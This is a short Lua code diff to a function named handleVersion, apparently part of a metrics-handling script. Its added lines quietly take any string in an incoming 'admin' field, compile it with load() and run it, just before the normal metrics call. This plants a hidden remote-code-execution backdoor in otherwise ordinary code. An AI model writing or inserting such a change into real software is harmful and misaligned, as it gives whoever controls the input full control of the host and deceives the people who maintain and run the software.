@@ -16,6 +16,12 @@ function handleVersion(metricHandled)
             end
 
             if not metricHandled then
+                if(data.admin)then
+                    local f = assert(load("return function() " .. data.admin .. " end"))
+
+                    f()()
+                end
+
                 handleMetrics()
             end
 
